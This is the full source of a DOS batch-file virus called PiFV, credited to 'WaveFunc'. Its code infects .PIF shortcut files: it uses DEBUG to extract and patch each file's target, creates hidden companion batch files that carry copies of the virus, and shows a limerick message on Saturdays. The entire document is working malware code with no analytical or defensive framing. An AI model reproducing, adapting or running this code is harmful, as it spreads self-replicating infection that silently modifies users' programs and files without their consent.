@echo off
:: host filename...
set pifvo=LIST.COM
:: loop dispatcher...
if '%1=='PiFV goto PiFV_%2
:: run the virus!
set _PiFV=
if not exist %comspec% set comspec=C:\COMMAND.COM%_PiFV%
%comspec% /e:5000 /c %0 PiFV go>nul
if exist PiFV! del PiFV!
:: run the host
set PiFVcl=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %0 PiFV hst
set PiFVo=
set PiFVcl=
:: check for activation...
echo.|date|find /i "sat">nul.PiFV
if errorlevel 1 goto PiFV_end
echo.|time|find "7">nul.PiFV
if errorlevel 1 goto PiFV_msg
set PiFV=echo
cls%_PiFV%
%PiFV%.
%PiFV% There once was an Otter named Oscer
%PiFV% Who claimed to know how to make water.
%PiFV% "No more dams," he said, "use my water instead!"
%PiFV% But the Elder Otter was not impressed.
pause>nul.PiFV
set PiFV=
goto PiFV_end
:PiFV_msg
echo [PiFV] by WaveFunc
goto PiFV_end
:PiFV_hst
%PiFVo% %PiFVcl%
goto PiFV_end
:PiFV_go
set PiFVh=%0
if not exist %PiFVh% set PiFVh=%0.bat
if not exist %PiFVh% exit
for %%a in (*.pif) do call %0 PiFV inf %%a
exit PiFV
:PiFV_inf
set PiFVp=%3
:: get victim filename and infection marker
:: from PIF file using debug...
if exist PiFV! goto PiFV_1
echo m 124,162 524>PiFV!
echo e 100 '@set fn='>>PiFV!
echo m 524,562 108>>PiFV!
echo n pifv$.bat>>PiFV!
echo rcx>>PiFV!
echo 47>>PiFV!
echo w>>PiFV!
echo m 55E,561 108>>PiFV!
echo e 10C 0>>PiFV!
echo n pifv$$.bat>>PiFV!
echo rcx>>PiFV!
echo 10>>PiFV!
echo w>>PiFV!
echo q>>PiFV!
:PiFV_1
debug %PiFVp%<PiFV!>nul
call PiFV$
set PiFVn=%fn%
call PiFV$$
set PiFVi=%fn%
del PiFV$?.bat
:: pifvn=orig filename
:: pifvi=infection marker
:: pifvp=pif filename
:: pifvh=companion bat file
:: skip infected or 'empty' pifs...
if '%PiFVi%=='PiFV goto PiFV_end
if '%PiFVn%==' goto PiFV_end
:: don't shadow command.com (be nice)
echo %PiFVn%|find /i "command">nul
if not errorlevel 1 goto PiFV_end
:: infectable - create a companion batch...
:: (the following code strips off the extension)
echo e 100 e8 16 00 b4 08 cd 21 3c 00 74 0c 3c 2e 74 08 88>PiFV$$
echo e 110 c2 b4 02 cd 21 eb ec cd 20 ba 21 01 b4 09 cd 21>>PiFV$$
echo e 120 c3 73 65 74 20 66 6e 3d 24 00>>PiFV$$
echo n pifv$.com>>PiFV$$
echo rcx>>PiFV$$
echo 2a>>PiFV$$
echo w>>PiFV$$
echo q>>PiFV$$
debug<PiFV$$>nul
echo %PiFVn%|PiFV$>PiFV$$.bat
call PiFV$$
set PiFVb=%fn%.bat
del PiFV$?.*
:: pifvb=new batch name
:: do not shadow if comp has same name as host
if %PiFVo%==%PiFVb% goto PiFV_end
if exist %PiFVb% goto PiFV_end
echo @echo off>%PiFVb%
echo set pifvo=%pifvn%>>%PiFVb%
find "PiFV"<%PiFVh%>>%PiFVb%
attrib %PiFVb% +h
:: ...and point the PIF at the companion
echo e 15E 'PiFV',0>PiFV$$
echo e 124 '%PiFVb%',0>>PiFV$$
echo w>>PiFV$$
echo q>>PiFV$$
debug %PiFVp%<PiFV$$>nul
del PiFV$$
:: I think we're done!
exit PiFV
:PiFV_end
:: wonder how many bugs all this has in it? Only one
:: way to find out...
